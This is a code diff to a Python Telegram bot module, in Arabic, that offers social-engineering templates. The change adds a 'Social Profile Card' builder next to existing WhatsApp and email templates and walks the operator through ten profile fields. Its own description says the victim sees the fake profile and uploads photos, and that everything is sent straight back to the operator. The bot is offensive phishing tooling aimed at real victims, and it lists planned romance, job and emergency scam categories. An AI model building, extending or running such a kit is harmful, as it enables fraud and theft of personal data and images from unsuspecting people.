@@ -1,7 +1,7 @@
 # social_engineering.py
 # ============================================================
-# قسم الهندسة الاجتماعية — v3.0
-# 19 قسم + WhatsApp + Email شغالين
+# قسم الهندسة الاجتماعية — v4.0
+# 19 قسم + WhatsApp + Email + Social Profile
 # ============================================================
 
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
@@ -17,6 +17,7 @@ logger = get_logger("social_engineering")
 CATEGORIES = {
     "whatsapp":   {"emoji": "📨", "name": "واتساب",             "available": True},
     "email":      {"emoji": "📧", "name": "البريد الإلكتروني",  "available": True},
+    "universal":  {"emoji": "🎯", "name": "قوالب عامة",          "available": True},
     "sms":        {"emoji": "📱", "name": "الرسائل النصية",     "available": False},
     "voice":      {"emoji": "📞", "name": "المكالمات الصوتية",  "available": False},
     "facebook":   {"emoji": "📘", "name": "فيسبوك",             "available": False},
@@ -33,7 +34,6 @@ CATEGORIES = {
     "jobs":       {"emoji": "👔", "name": "الوظائف",             "available": False},
     "emergency":  {"emoji": "🚨", "name": "الطوارئ",             "available": False},
     "romance":    {"emoji": "❤️", "name": "الحب والرومانسية",    "available": False},
-    "universal":  {"emoji": "🎯", "name": "قوالب عامة",          "available": False},
 }
 
 
@@ -226,7 +226,7 @@ WHATSAPP_TEMPLATES = {
 
 
 # ============================================================
-# ★★★ قوالب Email العشرة (جديد) ★★★
+# قوالب Email العشرة
 # ============================================================
 EMAIL_TEMPLATES = {
     "email_1": {
@@ -416,6 +416,22 @@ EMAIL_TEMPLATES = {
 
 
 # ============================================================
+# قوالب القسم العام (Universal)
+# ============================================================
+UNIVERSAL_TEMPLATES = {
+    "universal_profile": {
+        "emoji": "🎯",
+        "name": "Social Profile Card",
+        "desc": (
+            "بروفايل احترافي بأزرار تواصل (واتساب، تلجرام، انستقرام، فيسبوك، هاتف، إيميل، موقع).\n"
+            "الضحية تشوف البروفايل، تقدر ترفع صور، وكل حاجة ترجعلك فوراً."
+        ),
+        "available": True,
+    },
+}
+
+
+# ============================================================
 # Safe Edit Helper
 # ============================================================
 def _safe_edit(bot, call, text, reply_markup=None, parse_mode="HTML"):
@@ -458,7 +474,7 @@ def build_social_engineering_panel():
     """القائمة الرئيسية للهندسة الاجتماعية"""
     m = InlineKeyboardMarkup()
 
-    # الأقسام المتاحة (شغالة)
+    # ─── الأقسام المتاحة (3 شغالة دلوقتي) ───
     m.add(InlineKeyboardButton(
         "📨 واتساب ✨",
         callback_data="se_cat_whatsapp"
@@ -467,8 +483,12 @@ def build_social_engineering_panel():
         "📧 البريد الإلكتروني ✨",
         callback_data="se_cat_email"
     ))
+    m.add(InlineKeyboardButton(
+        "🎯 قوالب عامة ✨",
+        callback_data="se_cat_universal"
+    ))
 
-    # الأقسام "قريباً" — 17 قسم
+    # ─── الأقسام "قريباً" — 16 قسم ───
     soon_categories = [
         ("sms", "📱 الرسائل النصية"),
         ("voice", "📞 المكالمات الصوتية"),
@@ -486,7 +506,6 @@ def build_social_engineering_panel():
         ("jobs", "👔 الوظائف"),
         ("emergency", "🚨 الطوارئ"),
         ("romance", "❤️ الحب والرومانسية"),
-        ("universal", "🎯 قوالب عامة"),
     ]
 
     # جمع 2 في كل صف
@@ -531,7 +550,7 @@ def build_whatsapp_panel():
 
 
 # ============================================================
-# بناء قائمة Email (جديد)
+# بناء قائمة Email
 # ============================================================
 def build_email_panel():
     """قائمة قوالب البريد الإلكتروني"""
@@ -550,6 +569,22 @@ def build_email_panel():
             f"{idx}. {tpl['emoji']} {tpl['name']}",
             callback_data=f"se_tpl_{key}"
         ))
+
+    m.add(InlineKeyboardButton("🔙 رجوع للأقسام", callback_data="gen_se"))
+    return m
+
+
+# ============================================================
+# بناء قائمة Universal (قوالب عامة)
+# ============================================================
+def build_universal_panel():
+    """قائمة القوالب العامة"""
+    m = InlineKeyboardMarkup()
+
+    m.add(InlineKeyboardButton(
+        "🎯 Social Profile Card ✨",
+        callback_data="se_universal_profile"
+    ))
 
     m.add(InlineKeyboardButton("🔙 رجوع للأقسام", callback_data="gen_se"))
     return m
@@ -628,7 +663,7 @@ def handle_social_engineering_callback(call, bot, chat_id, user_id, data):
             "🎭 <b>قسم الهندسة الاجتماعية</b>\n"
             "━━━━━━━━━━━━━━━━━━━━\n\n"
             "📚 <b>الأقسام المتاحة:</b> 19 قسم\n"
-            "✅ <b>يعمل الآن:</b> واتساب + البريد الإلكتروني\n"
+            "✅ <b>يعمل الآن:</b> واتساب + البريد + قوالب عامة\n"
             "🚧 <b>قريباً:</b> باقي الأقسام\n\n"
             "💡 <i>اختر قسم للبدء</i>"
         )
@@ -678,7 +713,7 @@ def handle_social_engineering_callback(call, bot, chat_id, user_id, data):
         return True
 
     # ═══════════════════════════════════════════════════
-    # ★★★ فتح قسم Email ★★★
+    # فتح قسم Email
     # ═══════════════════════════════════════════════════
     if data == "se_cat_email":
         bot.answer_callback_query(call.id)
@@ -696,12 +731,91 @@ def handle_social_engineering_callback(call, bot, chat_id, user_id, data):
         return True
 
     # ═══════════════════════════════════════════════════
+    # ★★★ فتح قسم قوالب عامة ★★★
+    # ═══════════════════════════════════════════════════
+    if data == "se_cat_universal":
+        bot.answer_callback_query(call.id)
+
+        text = (
+            "🎯 <b>قوالب عامة</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━\n\n"
+            "📋 <b>القالب المتاح:</b>\n"
+            "🎨 <b>Social Profile Card</b>\n\n"
+            "بروفايل احترافي بأزرار تواصل:\n"
+            "• 💬 واتساب\n"
+            "• ✈️ تلجرام\n"
+            "• 📷 انستقرام\n"
+            "• 📘 فيسبوك\n"
+            "• 📞 هاتف\n"
+            "• ✉️ إيميل\n"
+            "• 🌐 موقع\n\n"
+            "💡 <i>اختر القالب للبدء</i>"
+        )
+
+        _safe_edit(bot, call, text, reply_markup=build_universal_panel())
+        return True
+
+    # ═══════════════════════════════════════════════════
+    # ★★★ بدء بناء Social Profile ★★★
+    # ═══════════════════════════════════════════════════
+    if data == "se_universal_profile":
+        bot.answer_callback_query(call.id)
+
+        text = (
+            "🎨 <b>Social Profile Card</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━\n\n"
+            "📝 <b>سنجمع البيانات خطوة بخطوة:</b>\n"
+            "1️⃣ الاسم\n"
+            "2️⃣ المسمى/الوظيفة\n"
+            "3️⃣ نبذة قصيرة\n"
+            "4️⃣ رقم الهاتف\n"
+            "5️⃣ رقم واتساب\n"
+            "6️⃣ يوزر تلجرام\n"
+            "7️⃣ يوزر انستقرام\n"
+            "8️⃣ يوزر فيسبوك\n"
+            "9️⃣ الإيميل\n"
+            "🔟 الموقع الرسمي\n\n"
+
+            "💡 <b>ملاحظة:</b> اكتب <code>تخطي</code> لتجاوز أي حقل\n\n"
+
+            "🎯 <b>يلا نبدأ!</b>"
+        )
+
+        m = InlineKeyboardMarkup()
+        m.add(InlineKeyboardButton(
+            "✨ ابدأ البناء",
+            callback_data="se_profile_new"
+        ))
+        m.add(InlineKeyboardButton("🔙 رجوع للقوالب", callback_data="se_cat_universal"))
+
+        _safe_edit(bot, call, text, reply_markup=m)
+        return True
+
+    # ═══════════════════════════════════════════════════
+    # ★★★ بدء الخطوة الأولى ★★★
+    # ═══════════════════════════════════════════════════
+    if data == "se_profile_new":
+        bot.answer_callback_query(call.id)
+
+        msg = bot.send_message(
+            chat_id,
+            "👤 <b>الخطوة 1/10</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━\n\n"
+            "أرسل <b>الاسم الكامل</b> للبروفايل:\n\n"
+            "مثال: <code>أحمد محمد</code>",
+            parse_mode="HTML"
+        )
+
+        from bot_handlers.steps.social_profile_steps import step_name
+        bot.register_next_step_handler(msg, step_name)
+        return True
+
+    # ═══════════════════════════════════════════════════
     # عرض قالب (WhatsApp أو Email)
     # ═══════════════════════════════════════════════════
     if data.startswith("se_tpl_"):
         template_key = data.replace("se_tpl_", "")
 
-        # تحقق من النوع
         if template_key.startswith("whatsapp_"):
             tpl = WHATSAPP_TEMPLATES.get(template_key)
         elif template_key.startswith("email_"):
